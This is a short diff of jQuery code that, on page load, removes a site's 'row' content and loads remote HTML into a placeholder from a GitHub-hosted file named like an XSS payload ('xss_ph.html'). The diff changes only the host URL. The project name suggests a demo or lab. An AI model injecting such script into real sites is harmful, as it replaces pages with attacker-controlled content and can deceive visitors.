@@ -9,6 +9,6 @@ $("nav").after(place_holder);
 $(window).on('load', function() {
     // Remove all unwanted content
     $(".row").remove();
-    $('.place_holder').load("https://cdn.jsdelivr.net/gh/hotMS/Contoso-Stake/SkateShop/xss_ph.html");
+    $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xxs_ph.html");
     console.log("done");
 });
